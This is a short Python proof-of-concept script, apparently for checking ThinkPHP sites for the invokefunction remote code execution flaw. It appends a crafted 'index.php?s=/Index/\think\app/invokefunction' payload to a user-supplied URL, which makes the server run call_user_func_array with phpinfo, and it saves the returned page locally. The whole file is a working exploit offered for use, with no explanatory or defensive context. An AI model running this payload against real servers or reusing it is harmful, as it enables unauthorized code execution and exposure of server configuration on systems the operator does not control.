#coding:utf-8
import sys
import requests,re
#index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
def verify(target_url):
    headers = {
        'User_Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'
    }
    resp = requests.get(target_url,headers=headers)
    with open("phpinfo.html",'wb') as f:
        f.write(resp.content)
if __name__ == '__main__':
    args = sys.argv
    url = args[1]
    taget_url = url+r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
    verify(taget_url)